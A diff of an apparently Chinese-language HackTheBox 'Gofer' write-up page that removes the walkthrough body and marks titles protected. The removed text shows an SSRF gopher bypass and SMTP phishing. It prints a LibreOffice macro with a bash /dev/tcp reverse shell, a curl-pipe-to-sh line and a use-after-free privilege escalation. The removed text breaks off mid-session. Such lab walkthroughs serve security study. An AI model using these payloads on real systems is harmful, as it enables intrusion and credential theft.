@@ -8,6 +8,8 @@
       
       
       
+        <link rel="canonical" href="https://Zer0-hex.github.io/write-up/HackTheBox/Machines/Gofer/">
+      
       
         <link rel="prev" href="../Download/">
       
@@ -20,7 +22,7 @@
     
     
       
-        <title>Hard - Gofer - Write-up</title>
+        <title>[Protected] Hard - Gofer - Write-up</title>
       
     
     
@@ -95,7 +97,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Hard - Gofer
+              [Protected] Hard - Gofer
             
           </span>
         </div>
@@ -144,6 +146,18 @@
   </div>
 </div>
     
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Zer0-hex/Zer0-hex.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Zer0-hex/Zer0-hex.github.io
+  </div>
+</a>
+      </div>
     
   </nav>
   
@@ -227,6 +241,18 @@
     </a>
     Write-up
   </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Zer0-hex/Zer0-hex.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Zer0-hex/Zer0-hex.github.io
+  </div>
+</a>
+    </div>
   
   <ul class="md-nav__list" data-md-scrollfix>
     
@@ -402,7 +428,7 @@
         
   
   <span class="md-ellipsis">
-    Very Easy - BabyEncryption
+    [Protected] Very Easy - BabyEncryption
   </span>
   
 
@@ -470,7 +496,7 @@
         
   
   <span class="md-ellipsis">
-    Easy-ProxyAsAService
+    [Protected] Easy-ProxyAsAService
   </span>
   
 
@@ -546,7 +572,7 @@
         
   
   <span class="md-ellipsis">
-    Appsanity
+    [Protected] Appsanity
   </span>
   
 
@@ -567,7 +593,7 @@
         
   
   <span class="md-ellipsis">
-    Codify
+    [Protected] Codify
   </span>
   
 
@@ -588,7 +614,7 @@
         
   
   <span class="md-ellipsis">
-    Download
+    [Protected] Download
   </span>
   
 
@@ -618,7 +644,7 @@
           
   
   <span class="md-ellipsis">
-    Hard - Gofer
+    [Protected] Hard - Gofer
   </span>
   
 
@@ -629,7 +655,7 @@
         
   
   <span class="md-ellipsis">
-    Hard - Gofer
+    [Protected] Hard - Gofer
   </span>
   
 
@@ -957,415 +983,38 @@
                 
                   
 
-
-<h1 id="hard-gofer">Hard - Gofer</h1>
-<p><img alt="Gofer" src="../assets/202310282359113.png" /></p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="nmap">Nmap</h3>
-<div class="language-text highlight"><pre><span></span><code># IP=&#39;10.10.11.225&#39;; nmap -sC -sV -O -p$(nmap -sS -p- --min-rate 1000 -T4 $IP | grep &#39;/tcp\|/udp&#39; | awk -F &#39;/&#39; &#39;{print $1}&#39; | tr &#39;\n&#39; &#39;,&#39;) $IP -oN nmap.txt
-
-Nmap scan report for 10.10.11.225
-Host is up (0.22s latency).
-
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
-| ssh-hostkey:
-|   3072 aa25826eb804b6a9a95e1a91f09451dd (RSA)
-|   256 1821baa7dce44f60d781039a5dc2e596 (ECDSA)
-|_  256 a42d0d45132a9e7f867af6f778bc42d9 (ED25519)
-25/tcp  filtered smtp
-80/tcp  open  http        Apache httpd 2.4.56
-|_http-server-header: Apache/2.4.56 (Debian)
-|_http-title: Did not follow redirect to http://gofer.htb/
-139/tcp open  netbios-ssn Samba smbd 4.6.2
-445/tcp open  netbios-ssn Samba smbd 4.6.2
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 2 hops
-Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-|_clock-skew: -1s
-| smb2-security-mode:
-|   311:
-|_    Message signing enabled but not required
-| smb2-time:
-|   date: 2023-10-28T16:10:54
-|_  start_date: N/A
-|_nbstat: NetBIOS name: GOFER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)
-</code></pre></div>
-<h3 id="smb">SMB</h3>
-<div class="language-text highlight"><pre><span></span><code>cme smb 10.10.11.225 -u guest -p &#39;&#39;  --shares
-</code></pre></div>
-<p><img alt="image-20231029004846069" src="../assets/202310290048135.png" /></p>
-<div class="language-text highlight"><pre><span></span><code>smbclient \\\\10.10.11.225\\shares -U guest
-</code></pre></div>
-<p><img alt="image-20231029005132290" src="../../../../../../../../home/zer0-hex/.config/Typora/typora-user-images/image-20231029005132290.png" /></p>
-<ul>
-<li>mail</li>
-</ul>
-<div class="language-text highlight"><pre><span></span><code>From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
-Return-Path: &lt;jdavis@gofer.htb&gt;
-X-Original-To: tbuckley@gofer.htb
-Delivered-To: tbuckley@gofer.htb
-Received: from gofer.htb (localhost [127.0.0.1])
-        by gofer.htb (Postfix) with SMTP id C8F7461827
-        for &lt;tbuckley@gofer.htb&gt;; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
-Subject:Important to read!
-Message-Id: &lt;20221028192857.C8F7461827@gofer.htb&gt;
-Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
-From: jdavis@gofer.htb
-
-Hello guys,
-
-Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That&#39;s why from now on, I&#39;ve decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.
-
-PS: Last thing for Tom; I know you&#39;re working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via &lt;Limit&gt;
-</code></pre></div>
-<h3 id="subdomain">Subdomain</h3>
-<div class="language-text highlight"><pre><span></span><code># ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://gofer.htb -H &quot;Host: FUZZ.gofer.htb&quot; -c -mc all --fw 20
-
-proxy                   [Status: 401, Size: 462, Words: 42, Lines: 15, Duration: 248ms]
-</code></pre></div>
-<h3 id="http">HTTP</h3>
-<ul>
-<li>gofer.htb</li>
-</ul>
-<p><img alt="image-20231029005548382" src="../assets/202310290055760.png" /></p>
-<p>结合邮箱中用户名的命名方式 <code>jdavis tbuckley</code> 猜测所有人的用户名</p>
-<div class="language-text highlight"><pre><span></span><code>jdavis      Chief Executive Officer
-jhudson     Product Manager
-tbuckley    CTO
-ablake      Accountant
-</code></pre></div>
-<ul>
-<li>目录枚举</li>
-</ul>
-<div class="language-text highlight"><pre><span></span><code># feroxbuster -x php -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -m GET,POST,PUT,OPTIONS,DELETE,PATCH -s 200 -u http://gofer.htb/
-
-No High Value Path
-</code></pre></div>
-<ul>
-<li>proxy.gofer.htb</li>
-</ul>
-<div class="language-text highlight"><pre><span></span><code># feroxbuster -x php -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -m GET,POST,PUT,OPTIONS,DELETE,PATCH -s 200 -u http://proxy.gofer.htb/
-...
-200     POST        2l       10w       81c http://proxy.gofer.htb/index.php
-200      PUT        2l       10w       81c http://proxy.gofer.htb/index.php
-200  OPTIONS        2l       10w       81c http://proxy.gofer.htb/index.php
-200   DELETE        2l       10w       81c http://proxy.gofer.htb/index.php
-200    PATCH        2l       10w       81c http://proxy.gofer.htb/index.php
-...
-</code></pre></div>
-<p><img alt="image-20231029012145079" src="../assets/202310290121155.png" /></p>
-<p>请求参数 <code>url=localhost</code> 存在黑名单</p>
-<p><img alt="image-20231029012506798" src="../assets/202310290125833.png" /></p>
-<p>请求 <code>url=127.0.0.1</code> 响应 gofer.htb 页面</p>
-<p><img alt="image-20231029012639993" src="../assets/202310290126023.png" /></p>
-<ul>
-<li>尝试其他 SSRF</li>
-</ul>
-<blockquote>
-<p>https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Request%20Forgery/</p>
-</blockquote>
-<p>对于请求的协议也存在黑名单</p>
-<p><img alt="image-20231029013243834" src="../assets/202310290132855.png" /></p>
-<p>尝试后发现 gopher 协议可以，但是对于地址有黑名单</p>
-<p><img alt="image-20231029013427293" src="../assets/202310290134323.png" /></p>
-<p>尝试绕过，可以用 0 代替 127.0.0.1 同时可以访问其他端口</p>
-<p><img alt="image-20231029014134989" src="../assets/202310290141013.png" /></p>
-<h2 id="shell-as-jhudson">Shell as jhudson</h2>
-<p>想到 nmap 扫描到 25 端口被过滤，同时 smb 服务的邮件提示可以使用 .odt 进行网络钓鱼（会有人点击链接）</p>
-<ul>
-<li>
-<p>构造恶意邮件发给 <code>Product Manager</code> 或者 <code>Accountant</code></p>
-</li>
-<li>
-<blockquote>
-<p>'https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Request%20Forgery/</p>
-</blockquote>
-</li>
-</ul>
-<div class="language-text highlight"><pre><span></span><code>_HELO 0
-MAIL FROM:&lt;jdavis@gofer.htbb&gt;
-RCPT TO:&lt;jhudson@gofer.htb&gt;
-DATA
-From: &lt;jdavis@gofer.htb&gt;
-To: &lt;jhudson@gofer.htb&gt;
-Date: Tue, 15 Sep 2017 17:20:26 -0400
-Subject: AH AH AH
-
-http://10.10.16.47/good.odt
-.
-QUIT
-</code></pre></div>
-<p>首先启动 HTTP 服务，查看是否能收到请求</p>
-<p><img alt="image-20231029022216710" src="../assets/202310290222773.png" /></p>
-<ul>
-<li>邮件中说明公司使用 Libreoffice，极有可能会自动打开，因此构造恶意 .odt 文件</li>
-<li>Libreoffice：新建文件 -&gt; 保存为 good.odt -&gt; 工具 -&gt; 宏 -&gt; 编辑宏 -&gt; 工具 -&gt; 选择宏 -&gt; 选中文件 -&gt; New</li>
-<li>工具 -&gt; 管理宏 -&gt; Basic 语言 -&gt; 选择宏 -&gt; 注册 Assign -&gt; Events -&gt; 选中 Open Document -&gt; 添加宏 macro... -&gt; 选择恶意宏 -&gt; 设置保存到文件中 -&gt; OK -&gt; Run</li>
-</ul>
-<div class="language-text highlight"><pre><span></span><code>REM  *****  BASIC  *****
-
-Sub Main
-    Shell(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.47/2233 0&gt;&amp;1&#39;&quot;)
-End Sub
-</code></pre></div>
-<p><img alt="image-20231029023249882" src="../assets/202310290232931.png" /></p>
-<p><img alt="image-20231029024458048" src="../assets/202310290244081.png" /></p>
-<p><img alt="image-20231029023710028" src="../assets/202310290237097.png" /></p>
-<h3 id="get-usertxt">Get User.txt</h3>
-<p><img alt="image-20231029025156873" src="../assets/202310290251944.png" /></p>
-<div class="language-text highlight"><pre><span></span><code>jhudson@gofer:~$ cat user.txt
-e07152e2976495f478ee9a8d0d356ea5
-</code></pre></div>
-<h3 id="linpeassh">linpeas.sh</h3>
-<div class="language-text highlight"><pre><span></span><code>[Attack]# nc -lvvnp 2233 | tee results/linpeas.log
-[Target]# curl http://10.10.16.47/linpeas.sh | sh &gt; /dev/tcp/10.10.16.47/2233 2&gt;1
-</code></pre></div>
-<h2 id="shell-as-tbuckley">Shell as tbuckley</h2>
-<p>发现 Capabilities</p>
-<p><img alt="image-20231029030823241" src="../assets/202310290308307.png" /></p>
-<blockquote>
-<p>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</p>
-</blockquote>
-<p>尝试使用 tcpdump 提权</p>
-<ul>
-<li>/tmp/shell</li>
-</ul>
-<div class="language-text highlight"><pre><span></span><code>#!/bin/bash
-/bin/bash -p
-</code></pre></div>
-<div class="language-text highlight"><pre><span></span><code>tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell
-</code></pre></div>
-<p><img alt="image-20231029033107145" src="../assets/202310290331181.png" /></p>
-<p>命令执行提权失败，想到 proxy.gofer.htb 是一个代理服务，可能会有其他用户使用，因此监听 80 端口，看看是否有流量出现。</p>
-<p><img alt="image-20231029033443391" src="../assets/202310290334435.png" /></p>
-<p>发现一个认证，解码发现是 tbuckley 的凭据</p>
-<p><img alt="image-20231029033518846" src="../assets/202310290335871.png" /></p>
-<p>tbuckley 在 dev 组，有一个 SUID 权限的可执行程序</p>
-<p><img alt="image-20231029033823016" src="../../../../../../../../home/zer0-hex/.config/Typora/typora-user-images/image-20231029033823016.png" /></p>
-<h2 id="shell-as-root">Shell as root</h2>
-<p>简单分析一下 notes</p>
-<p><img alt="image-20231029034005869" src="../assets/202310290340892.png" /></p>
-<div class="language-c highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="kr">__cdecl</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-<span class="p">{</span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">v3</span><span class="p">;</span><span class="w"> </span><span class="c1">// rax</span>
-<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">v5</span><span class="p">;</span><span class="w"> </span><span class="c1">// [rsp+Ch] [rbp-14h] BYREF</span>
-<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">;</span><span class="w"> </span><span class="c1">// [rsp+10h] [rbp-10h]</span>
-<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="p">;</span><span class="w"> </span><span class="c1">// [rsp+18h] [rbp-8h]</span>
-
-<span class="w">  </span><span class="n">v5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
-<span class="w">  </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
-<span class="w">  </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
-<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">)</span>
-<span class="w">  </span><span class="p">{</span>
-<span class="w">    </span><span class="n">puts</span><span class="p">(</span>
-<span class="w">      </span><span class="s">&quot;========================================</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">      </span><span class="s">&quot;1) Create an user and choose an username</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">      </span><span class="s">&quot;2) Show user information</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">      </span><span class="s">&quot;3) Delete an user</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">      </span><span class="s">&quot;4) Write a note</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">      </span><span class="s">&quot;5) Show a note</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">      </span><span class="s">&quot;6) Save a note (not yet implemented)</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">      </span><span class="s">&quot;7) Delete a note</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">      </span><span class="s">&quot;8) Backup notes</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">      </span><span class="s">&quot;9) Quit</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">      </span><span class="s">&quot;========================================</span><span class="se">\n</span><span class="s">&quot;</span>
-<span class="w">      </span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Your choice: &quot;</span><span class="p">);</span>
-<span class="w">    </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
-<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_212E</span><span class="p">);</span>
-<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">v5</span><span class="w"> </span><span class="p">)</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span>
-<span class="w">        </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28uLL</span><span class="p">);</span>
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">s</span><span class="w"> </span><span class="p">)</span>
-<span class="w">          </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
-<span class="w">        </span><span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x18uLL</span><span class="p">);</span>
-<span class="w">        </span><span class="n">memset</span><span class="p">((</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">24</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10uLL</span><span class="p">);</span>
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">getuid</span><span class="p">()</span><span class="w"> </span><span class="p">)</span>
-<span class="w">        </span><span class="p">{</span>
-<span class="w">          </span><span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1919251317</span><span class="p">;</span>
-<span class="w">        </span><span class="p">}</span>
-<span class="w">        </span><span class="k">else</span>
-<span class="w">        </span><span class="p">{</span>
-<span class="w">          </span><span class="n">v3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">24</span><span class="p">;</span>
-<span class="w">          </span><span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1768776801</span><span class="p">;</span>
-<span class="w">          </span><span class="n">v3</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">110</span><span class="p">;</span>
-<span class="w">        </span><span class="p">}</span>
-<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Choose an username: &quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%23s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">);</span>
-<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_212E</span><span class="p">);</span>
-<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
-<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span>
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">s</span><span class="w"> </span><span class="p">)</span>
-<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">LABEL_11</span><span class="p">;</span>
-<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Username: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="p">);</span>
-<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Role: %s</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">24</span><span class="p">);</span>
-<span class="w">        </span><span class="k">break</span><span class="p">;</span>
-<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span>
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="p">)</span>
-<span class="w">          </span><span class="n">free</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
-<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
-<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span>
-<span class="w">        </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28uLL</span><span class="p">);</span>
-<span class="w">        </span><span class="n">memset</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x28uLL</span><span class="p">);</span>
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">ptr</span><span class="w"> </span><span class="p">)</span>
-<span class="w">          </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
-<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Write your note:&quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%39s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ptr</span><span class="p">);</span>
-<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
-<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span>
-<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Note: %s</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">);</span>
-<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
-<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">6</span><span class="p">:</span>
-<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Coming soon!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
-<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">7</span><span class="p">:</span>
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">)</span>
-<span class="w">        </span><span class="p">{</span>
-<span class="w">          </span><span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
-<span class="w">          </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
-<span class="w">        </span><span class="p">}</span>
-<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
-<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">8</span><span class="p">:</span>
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="p">)</span>
-<span class="w">        </span><span class="p">{</span>
-<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">24</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;admin&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
-<span class="w">          </span><span class="p">{</span>
-<span class="w">            </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Access granted!&quot;</span><span class="p">);</span>
-<span class="w">            </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="w">            </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="w">            </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;tar -czvf /root/backups/backup_notes.tar.gz /opt/notes&quot;</span><span class="p">);</span>
-<span class="w">          </span><span class="p">}</span>
-<span class="w">          </span><span class="k">else</span>
-<span class="w">          </span><span class="p">{</span>
-<span class="w">            </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Access denied: you don&#39;t have the admin role!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-<span class="w">          </span><span class="p">}</span>
-<span class="w">        </span><span class="p">}</span>
-<span class="w">        </span><span class="k">else</span>
-<span class="w">        </span><span class="p">{</span>
-<span class="nl">LABEL_11</span><span class="p">:</span>
-<span class="w">          </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;First create an user!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="p">}</span>
-<span class="w">        </span><span class="k">break</span><span class="p">;</span>
-<span class="w">      </span><span class="k">default</span><span class="o">:</span>
-<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-<p>可以看到在 <code>case 8</code> 中设置了 uid 为 0 后调用 tar，因此可以劫持环境变量</p>
-<p>若要正常执行到 system 部分，需要 s[24:] == admin 修改 s 变量的位置为 <code>case 1</code></p>
-<p>因此构造 <code>username = 12345678901234567890123admin</code></p>
-<div class="language-text highlight"><pre><span></span><code>tbuckley@gofer:~$ /usr/local/bin/notes
-========================================
-1) Create an user and choose an username
-2) Show user information
-3) Delete an user
-4) Write a note
-5) Show a note
-6) Save a note (not yet implemented)
-7) Delete a note
-8) Backup notes
-9) Quit
-========================================
+  
+  
 
 
-Your choice: 1
